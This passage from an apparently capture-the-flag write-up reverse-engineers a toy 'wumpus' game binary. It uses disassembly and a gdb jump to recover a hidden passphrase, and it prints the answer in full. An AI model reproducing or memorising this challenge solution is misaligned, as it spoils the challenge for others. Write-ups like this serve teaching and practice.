&lt;span class="p"&gt;|&lt;/span&gt;           0x00402779      488b05b82920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m4&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605138:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 &lt;span class="p"&gt;;&lt;/span&gt; obj.m4
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402780      0fb64007       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 7&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x7:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402784      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402786      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040278a      488d500e       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xe&lt;span class="o"&gt;]&lt;/span&gt;        &lt;span class="p"&gt;;&lt;/span&gt; 0xe
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040278e      488b05b32920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m6&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605148:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 &lt;span class="p"&gt;;&lt;/span&gt; obj.m6
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402795      0fb64003       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 3&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x3:1&lt;span class="o"&gt;]=&lt;/span&gt;70
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402799      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040279b      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040279f      488d500f       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xf&lt;span class="o"&gt;]&lt;/span&gt;        &lt;span class="p"&gt;;&lt;/span&gt; 0xf
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027a3      488b056e2920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m3&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605118:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402958 str.0123456789abcdef LEA obj.m3 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;X)@&amp;quot;&lt;/span&gt; @ 0x605118
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027aa      0fb6400d       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xd&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0xd:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027ae      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027b0      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027b4      488d5010       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x10&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x10
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027b8      488b05592920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m3&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605118:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402958 str.0123456789abcdef LEA obj.m3 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;X)@&amp;quot;&lt;/span&gt; @ 0x605118
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027bf      0fb6400e       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xe&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0xe:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027c3      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027c5      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027c9      488d5011       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x11&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x11
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027cd      488b055c2920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m2&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605130:8&lt;span class="o"&gt;]=&lt;/span&gt;0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 &lt;span class="p"&gt;;&lt;/span&gt; obj.m2
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027d4      0fb64006       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 6&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x6:1&lt;span class="o"&gt;]=&lt;/span&gt;1
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027d8      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027da      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027de      488d5012       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x12&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x12 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027e2      488b055f2920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m6&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605148:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 &lt;span class="p"&gt;;&lt;/span&gt; obj.m6
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027e9      0fb600         movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027ec      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027ee      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027f2      488d5013       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x13&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x13
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027f6      488b05232920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m0&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605120:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;p)@&amp;quot;&lt;/span&gt; @ 0x605120
&lt;span class="p"&gt;|&lt;/span&gt;           0x004027fd      0fb600         movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402800      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402802      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402806      488d5014       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x14&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x14
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040280a      488b05272920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m4&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605138:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 &lt;span class="p"&gt;;&lt;/span&gt; obj.m4
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402811      0fb64006       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 6&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x6:1&lt;span class="o"&gt;]=&lt;/span&gt;1
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402815      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402817      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040281b      488d5015       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x15&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x15
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040281f      488b05fa2820.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m0&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605120:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;p)@&amp;quot;&lt;/span&gt; @ 0x605120
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402826      0fb6400a       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xa&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0xa:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040282a      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040282c      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402830      488d5016       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x16&lt;span class="o"&gt;]&lt;/span&gt;       &lt;span class="p"&gt;;&lt;/span&gt; 0x16
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402834      488b050d2920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m6&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605148:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 &lt;span class="p"&gt;;&lt;/span&gt; obj.m6
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040283b      0fb64004       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 4&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x4:1&lt;span class="o"&gt;]=&lt;/span&gt;2
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040283f      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402841      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402845      4889c7         mov rdi, rax
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402848      e861f6ffff     call sym.to_upper
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040284d      bf9f364000     mov edi, str._nPassphrase:  &lt;span class="p"&gt;;&lt;/span&gt; str._nPassphrase:
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402852      e859e2ffff     call sym.imp.puts          &lt;span class="p"&gt;;&lt;/span&gt; int puts&lt;span class="o"&gt;(&lt;/span&gt;const char *s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402857      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040285b      4889c7         mov rdi, rax
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040285e      e84de2ffff     call sym.imp.puts          &lt;span class="p"&gt;;&lt;/span&gt; int puts&lt;span class="o"&gt;(&lt;/span&gt;const char *s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402863      &lt;span class="m"&gt;90&lt;/span&gt;             nop
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402864      c9             leave
&lt;span class="se"&gt;\ &lt;/span&gt;          0x00402865      c3             ret
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Instead of trying to statically analyze this function, we can use &lt;code&gt;gdb&lt;/code&gt;
to directly jump to it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gdb ./wumpus
GNU gdb &lt;span class="o"&gt;(&lt;/span&gt;Debian 7.7.1+dfsg-5&lt;span class="o"&gt;)&lt;/span&gt; 7.7.1
Copyright &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; Free Software Foundation, Inc.
License GPLv3+: GNU GPL version &lt;span class="m"&gt;3&lt;/span&gt; or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &lt;span class="s2"&gt;&amp;quot;show copying&amp;quot;&lt;/span&gt;
and &lt;span class="s2"&gt;&amp;quot;show warranty&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; details.
This GDB was configured as &lt;span class="s2"&gt;&amp;quot;x86_64-linux-gnu&amp;quot;&lt;/span&gt;.
Type &lt;span class="s2"&gt;&amp;quot;show configuration&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For &lt;span class="nb"&gt;help&lt;/span&gt;, &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;.
Type &lt;span class="s2"&gt;&amp;quot;apropos word&amp;quot;&lt;/span&gt; to search &lt;span class="k"&gt;for&lt;/span&gt; commands related to &lt;span class="s2"&gt;&amp;quot;word&amp;quot;&lt;/span&gt;...
Reading symbols from ./wumpus...&lt;span class="o"&gt;(&lt;/span&gt;no debugging symbols found&lt;span class="o"&gt;)&lt;/span&gt;...done.
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; r
Starting program: ./wumpus
Instructions? &lt;span class="o"&gt;(&lt;/span&gt;y-n&lt;span class="o"&gt;)&lt;/span&gt; ^Z
Program received signal SIGTSTP, Stopped &lt;span class="o"&gt;(&lt;/span&gt;user&lt;span class="o"&gt;)&lt;/span&gt;.
0x00007ffff7b0cba0 in __read_nocancel &lt;span class="o"&gt;()&lt;/span&gt; at ../sysdeps/unix/syscall-template.S:81
&lt;span class="m"&gt;81&lt;/span&gt;  ../sysdeps/unix/syscall-template.S: Aucun fichier ou dossier de ce type.
&lt;span class="hll"&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; j kill_wump
&lt;/span&gt;Continuing at 0x402648.
*thwock!* *groan* *crash*

A horrible roar fills the cave, and you realize, with a smile, that you
have slain the evil Wumpus and won the game!  You don&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t want to tarry &lt;span class="k"&gt;for&lt;/span&gt;
long, however, because not only is the Wumpus famous, but the stench of
dead Wumpus is also quite well known, a stench plenty enough to slay the
mightiest adventurer at a single whiff!!

Passphrase:
&lt;span class="hll"&gt;WUMPUS IS MISUNDERSTOOD
&lt;/span&gt;
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7ff5000 in ?? &lt;span class="o"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you &lt;cite&gt;reaaaaally&lt;/cite&gt; want to do it by hand, here's a short explanation (statical
analysis and disassembly are not my strong suits):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402656      bf18000000     mov edi, 0x18               &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0.@&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040265b      e8f0e4ffff     call sym.imp.malloc        &lt;span class="p"&gt;;&lt;/span&gt;  void *malloc&lt;span class="o"&gt;(&lt;/span&gt;size_t size&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402660      488945f8       mov qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;, rax
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402664      488b05cd2a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m4&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605138:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 &lt;span class="p"&gt;;&lt;/span&gt; obj.m4
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040266b      0fb65009       movzx edx, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 9&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x9:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040266f      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402673      &lt;span class="m"&gt;8810&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rax&lt;span class="o"&gt;]&lt;/span&gt;, dl
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402675      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Before the passphrase is printed, we can see that the program allocates memory
for a buffer, with a call so &lt;code&gt;sym.imp.malloc&lt;/code&gt;. The size of the buffer is
&lt;code&gt;0x18&lt;/code&gt; bytes, which is exactly the size of our final passphrase, plus
one, for the NULL byte (&lt;strong&gt;wink, wink&lt;/strong&gt;). So, our final passphrase will be
constructed and put into a final buffer.&lt;/p&gt;
&lt;p&gt;Then, we can see that several strings are used to compute our final passphrase.
The first one is:&lt;/p&gt;
&lt;blockquote&gt;
When you &lt;strong&gt;w&lt;/strong&gt;ant to know how things really work, study them when
they're coming apart&lt;/blockquote&gt;
&lt;p&gt;The pointer to this string is put into the &lt;code&gt;rax&lt;/code&gt; register. The byte
situated at &lt;code&gt;rax + 9&lt;/code&gt; is then put into the &lt;code&gt;edx&lt;/code&gt; register. If we
take our string, and get the 9th character (starting counting from 0), we get
the &lt;code&gt;w&lt;/code&gt; from &lt;code&gt;want&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This character is then moved to the &lt;code&gt;local_8h&lt;/code&gt; variable. We now have a
&lt;code&gt;local_8h&lt;/code&gt; variable, starting with &lt;code&gt;w&lt;/code&gt;. Incidently, it's the first
character of our final passphrase (see where this is going?).&lt;/p&gt;
&lt;p&gt;We then move on to the second character, using the following string:&lt;/p&gt;
&lt;blockquote&gt;
We have no fut&lt;strong&gt;u&lt;/strong&gt;re because our present is too volatile. We have
only risk management.&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402679      488d5001       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 1&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x1
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040267d      488b05bc2a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m5&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605140:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`*@&amp;quot;&lt;/span&gt; @ 0x605140
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402684      0fb6400e       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xe&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0xe:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402688      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040268a      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We see that the byte situated at &lt;code&gt;rax + 0xe&lt;/code&gt;, which is the second
&lt;code&gt;u&lt;/code&gt; in &lt;code&gt;future&lt;/code&gt;, is stored in &lt;code&gt;edx&lt;/code&gt;. This character is then
moved to &lt;code&gt;local_8h + 1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Our &lt;code&gt;local_8h&lt;/code&gt; now begins with &lt;code&gt;wu&lt;/code&gt;. We do this for the rest of the
strings, and we finally get &lt;code&gt;wumpus is misunderstood&lt;/code&gt;, before the call to
the &lt;code&gt;sym.to_upper&lt;/code&gt; function, giving us the final passphrase.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040283b      0fb64004       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 4&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x4:1&lt;span class="o"&gt;]=&lt;/span&gt;2
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040283f      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402841      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402845      4889c7         mov rdi, rax
&lt;span class="hll"&gt;&lt;span class="p"&gt;|&lt;/span&gt;           0x00402848      e861f6ffff     call sym.to_upper
&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;           0x0040284d      bf9f364000     mov edi, str._nPassphrase:  &lt;span class="p"&gt;;&lt;/span&gt; str._nPassphrase:
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402852      e859e2ffff     call sym.imp.puts          &lt;span class="p"&gt;;&lt;/span&gt; int puts&lt;span class="o"&gt;(&lt;/span&gt;const char *s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="p"&gt;|&lt;/span&gt;           0x00402857      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="p"&gt;|&lt;/span&gt;           0x0040285b      4889c7         mov rdi, rax
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="p"&gt;|&lt;/span&gt;           0x0040285e      e84de2ffff     call sym.imp.puts          &lt;span class="p"&gt;;&lt;/span&gt; int puts&lt;span class="o"&gt;(&lt;/span&gt;const char *s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
